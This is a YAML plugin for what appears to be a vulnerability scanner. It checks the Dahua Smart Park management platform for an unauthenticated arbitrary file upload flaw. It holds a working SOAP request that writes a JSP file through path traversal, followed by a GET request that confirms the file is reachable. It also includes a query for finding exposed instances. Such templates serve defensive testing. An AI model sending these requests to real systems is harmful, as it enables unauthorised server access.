core/plugins/exploits/大华智慧园区_前台_poi_文件上传.yaml

app: 大华智慧园区综合管理平台
query: app:"大华智慧园区综合管理平台"
meta:
  name: 大华智慧园区 前台 poi 文件上传
  level: 4
  tags:
  - file_upload
  description: 大华智慧园区综合管理平台 /emap/webservice/gis/soap/poi接口处存在任意文件上传漏洞，未授权的攻击者可以上传后门文件，从而控制服务器权限。
  homepage: ""
  author: X prism
  references: ""
  solution: 升级至最新版、安装补丁
  create_at: "2024-07-12 23:34:29"
  available: false
  steps:
    variable: []
    verify_steps:
      type: and
      verify:
      - request:
          method: POST
          path: /emap/webservice/gis/soap/poi
          redirect: true
          header:
          - Content-Type: text/xml;charset=UTF-8
          params: |-
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
               <soapenv:Header/>
               <soapenv:Body>
                  <res:uploadPicFile>
                     <arg0>/../../aas11.jsp</arg0>
                     <arg1>xxxxxxxx</arg1>
                  </res:uploadPicFile>
               </soapenv:Body>
            </soapenv:Envelope>
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: xmlns
          type: contains
      - request:
          method: GET
          path: /upload/aas11.jsp
          redirect: true
          header: []
          params: ""
        response:
        - name: code
          value: "200"
          type: equals
        - name: body
          value: xxxxxxxx
          type: contains
    exploit_steps:
      type: ""
      params:
        name: ""
        type: input
        value: ""
